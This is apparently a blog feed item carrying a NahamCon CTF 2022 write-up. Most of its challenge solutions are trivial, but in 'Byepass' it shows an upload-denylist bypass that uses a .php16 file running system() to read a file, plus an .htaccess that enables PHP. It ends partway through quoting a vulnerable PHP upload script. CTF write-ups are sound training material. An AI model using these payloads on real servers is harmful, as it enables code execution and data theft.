    </item>
    
    <item>
      <title>NahamCon CTF 2022 - Writeup</title>
      <link>/posts/nahamcon2022/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/nahamcon2022/</guid>
      <description>Technical Support Author: @JohnHammond#6971 Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server! Go on the discord, in the #nahamcon-ctf-general channel, and we can see this in the channel description
flag ‚Üí flag{a98373a74abb8c5ebb8f5192e034a91c}</description>
      <content>&lt;h1 id=&#34;technical-support&#34;&gt;Technical Support&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go on the discord, in the &lt;a href=&#34;https://discord.com/channels/598608711186907146/1053097744241283142&#34;&gt;#nahamcon-ctf-general&lt;/a&gt; channel, and we can see this in the channel description&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png&#34; alt=&#34;2022-12-17-172256_1335x78_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{a98373a74abb8c5ebb8f5192e034a91c}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;babys-first-heartbleed&#34;&gt;Baby‚Äôs First Heartbleed&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Start the machine, and connect to it using nc&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nc challenge.nahamcon.com 31985&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;really guessed this one ‚Äî when he asks for a string just type anything (like ‚Äú&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;hello‚Äù&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; for example) and when he asks for a length, type a &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;high number&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You should see the flag appear in the server response:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268344-dc135f5b-8bca-43bb-b899-5c3ae30df6bc.png&#34; alt=&#34;2022-12-17-172914_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{bfca3d71260e581ba366dca054f5c8e5}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;read-the-rules&#34;&gt;Read The Rules&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Please follow the rules for this CTF!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go to the &lt;a href=&#34;https://ctf.nahamcon.com/rules&#34;&gt;rules pages&lt;/a&gt; and open up DevTools (or go to view-source) and you should find a comment with the flag at the very bottom of the page‚Äôs html&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268349-17827a40-0c4c-4502-bb87-ec932abbcd50.png&#34; alt=&#34;2022-12-17-173352_943x617_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{90bc54705794a62015369fd8e86e557b}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;hashstation&#34;&gt;Hashstation&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Below is a SHA256 hash! Can you determine what the original data was, before it was hashes?

705db0603fd5431451dab1171b964b4bd575e2230f40f4c300d70df6e65f5f1c
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You could probably do it with hashcat, but i‚Äôm lazy so i‚Äôll just use &lt;a href=&#34;http://crackstation.net&#34;&gt;crackstation.net&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268371-e7fa0ef8-00f3-410f-8696-4396f4945dcf.png&#34; alt=&#34;2022-12-17-190623_1056x434_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;flag{awesome}&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;catscii&#34;&gt;Catscii&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Do you know what the cat command does in the Linux command-line?
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Download the file and cat its content&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è cat catscii&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268377-98773958-b8a1-4888-8996-1ad12557f7d5.png&#34; alt=&#34;2022-12-17-190848_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{258da40ab06be7c99099d603a3b3ccb1}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;banjo&#34;&gt;Banjo&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Oooh, that classic twang! The banjo is one of my favorite strings instruments!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Download the image, and use the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;strings&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; command on it, then &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;grep flag&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è strings banjo.jpg | grep flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268383-2e539cec-5632-4a7d-8594-9a741322edb6.png&#34; alt=&#34;2022-12-17-191103_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{ce4e687e575392ae242f0e41c888de11}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;arjeebee&#34;&gt;Arjeebee&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

What is the rgb(19,55,175) color in its hexadecimal representation?
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go to &lt;a href=&#34;https://www.rgbtohex.net/&#34;&gt;rgbtohex.net&lt;/a&gt; and enter the RGB values&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268387-601be543-3b43-404f-8a2f-8d755ac02d58.png&#34; alt=&#34;2022-12-17-191342_762x467_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí flag{#1337AF}&lt;/p&gt;
&lt;h1 id=&#34;way-2-basic&#34;&gt;Way 2 Basic&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Here is some data represented in base 2. What is this data represented as ASCII text?

01100110 01101100 01100001 01100111 01111011 00111001 00110000 01100011 00110110 01100101 01100010 01100101 00111001 00110100 00110001 00110101 00110110 00110001 01100011 01100110 01100001 01100100 01100110 01100001 01100101 00110001 00110111 00110000 01100001 00111000 01100110 00110000 01100101 01100001 00110010 00110101 00110010 01111101
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go to &lt;a href=&#34;https://www.rapidtables.com/convert/number/binary-to-ascii.html&#34;&gt;any binary to text website&lt;/a&gt; (base 2 and binary are the same thing)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268400-4c9af57c-7224-425b-a37e-d734dc4b89fc.png&#34; alt=&#34;2022-12-17-191609_646x566_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{90c6ebe941561cfadfae170a8f0ea252}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;byepass&#34;&gt;Byepass&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!

Retrieve the flag out of the root of the filesystem /flag.txt.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since we have the website‚Äôs source code, we can see that there is an upload form at &lt;strong&gt;&lt;strong&gt;/save_memories.php&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We can also see which file extentions are blacklisted&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ext_denylist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php2&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php3&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php4&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php5&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php6&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php7&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phps&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phps&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pht&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phtm&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phtml&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pgif&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;shtml&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phar&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;inc&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hphp&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ctp&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The danger when using blacklists is forgetting something, and that‚Äôs what happened here: the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;.php16&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; extention is not filtered&lt;/p&gt;
&lt;p&gt;The challenge‚Äôs description tells us that the flag is located in the root of the filesystem, so we can directly try to &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;cat&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; it using php&lt;/p&gt;
&lt;p&gt;First, let‚Äôs create a &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;exploit.php16&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; file, with our malicious code inside&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat ../../../../../flag.txt&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Upload it, and read it by going to &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/exploit.php16&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png&#34; alt=&#34;2022-12-17-203048_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;aaaaaand‚Ä¶ it‚Äôs blank&lt;/p&gt;
&lt;p&gt;This can happen for two reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It did not manage to &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;cat&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; the file&lt;/li&gt;
&lt;li&gt;PHP engine is not enabled&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Assuming &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;flag.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; exists, it is because the php engine is not enabled&lt;/p&gt;
&lt;p&gt;By looking at the request, we know it‚Äôs running Apache, so we can try to upload a &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;.htaccess&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; file that will enable &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;php&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;.htaccess:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;AddType&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;application&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;httpd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php_flag&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;engine&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Upload dit, and read it by going to &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/.htaccess&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png&#34; alt=&#34;2022-12-17-203816_929x261_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;We get a 403 Forbidden response, &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;which is a good sign&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, because by default, Apache prevents users from reading files such as &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;.htaccess&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now, let‚Äôs re-upload our &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;php16&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; file&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268416-303e5c36-bb7d-4646-b814-83652f92294f.png&#34; alt=&#34;2022-12-17-204028_834x171_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;The PHP is now executed and not read&lt;/p&gt;
&lt;p&gt;flag -&amp;gt; &lt;strong&gt;flag{32697ad7acd2d4718758d9a5ee42965d}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;use-after-exit&#34;&gt;Use After Exit&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @carlopolop#3938

It&amp;#39;s as easy as it looks, isn&amp;#39;t it?
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When we visit the website, we can see the following code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;]))&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†&lt;/span&gt;$file_name¬†&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†urldecode&lt;/span&gt;($_FILES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†&lt;/span&gt;$tmp_path¬†&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;$_FILES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;strpos&lt;/span&gt;($file_name,&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.jpg&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†false&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†¬†¬†¬†¬†echo¬†&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid¬†file¬†name&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†¬†¬†¬†¬†exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†&lt;/span&gt;$content¬†&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†file_get_contents&lt;/span&gt;($tmp_path);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†&lt;/span&gt;$all_content¬†&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;?php¬†exit(0);&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;$content¬†&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†¬†¬†¬†&lt;/span&gt;$handle¬†&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†fopen&lt;/span&gt;($file_name,&lt;span style=&#34;color:#a6e22e&#34;&gt;¬†&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;);
